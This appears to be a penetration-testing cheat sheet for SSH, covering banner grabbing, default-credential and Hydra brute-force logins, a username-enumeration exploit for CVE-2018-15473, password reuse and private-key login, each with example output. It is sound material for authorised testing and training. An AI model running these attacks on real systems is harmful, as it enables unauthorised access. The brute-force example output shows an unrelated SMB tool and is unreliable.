# SSH (22)

### Banner grab / version check

```bash
nc -nv $IP 22
```

> Note exact version

**Why:** Old versions have vulns

<details>
<summary>Example Output</summary>

```
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
(Old version = check CVE-2018-15473 user enum)
```
</details>

---

### Try default creds

```bash
ssh admin@$IP
ssh root@$IP
```

> admin:admin, root:root, root:toor

**Why:** Always try the obvious

<details>
<summary>Example Output</summary>

```
ssh admin@10.10.10.5
Password: admin
Welcome to Ubuntu 18.04.3 LTS
$ whoami
admin

Common combos to try:
admin:admin, root:root, root:toor
user:user, admin:password, root:password
```
</details>

---

### Brute force with found users

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

> Only if you have a username

**Why:** Weak passwords

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt
SMB [+] corp.local\john:Password1
(Valid domain credentials found)
```
</details>

---

### Check for user enumeration

```bash
searchsploit openssh
```

> OpenSSH &lt; 7.7 CVE-2018-15473

**Why:** Confirm valid usernames

<details>
<summary>Example Output</summary>

```
OpenSSH 7.2p2 - Username Enumeration
$ python3 45233.py -u root 10.10.10.5
[+] root is a valid username
```
</details>

---

### Try found creds from other services

```bash
ssh <user>@$IP
```

> Password reuse is common

**Why:** Always cross-reference creds

<details>
<summary>Example Output</summary>

```
Found admin:admin123 on FTP
ssh admin@10.10.10.5  password: admin123
Welcome to Ubuntu
(PASSWORD REUSE - same creds worked on SSH)
```
</details>

---

### SSH with private key

```bash
chmod 600 id_rsa
ssh -i id_rsa <user>@$IP
```

> If you find a key file

**Why:** Check FTP, SMB, web for keys

<details>
<summary>Example Output</summary>

```
chmod 600 id_rsa
ssh -i id_rsa admin@10.10.10.5
Welcome to Ubuntu 18.04
admin@target:~$ whoami
admin
```
</details>

---
